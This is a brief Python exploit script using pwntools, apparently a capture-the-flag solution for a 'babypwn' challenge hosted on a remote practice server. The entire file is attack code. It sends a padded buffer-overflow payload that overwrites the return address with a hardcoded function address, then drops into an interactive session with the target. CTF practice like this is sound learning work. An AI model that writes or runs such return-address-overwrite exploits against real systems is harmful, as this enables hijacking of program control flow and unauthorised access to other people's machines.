from pwn import *

# a = process('./babypwn')
a= remote('prob.vulnerable.kr', 20035)
raw_input('debug')
flag2_add = 0x0000000000400636
buf = 'a'*0x408
buf += p64(flag2_add)

a.sendline(buf)

a.interactive()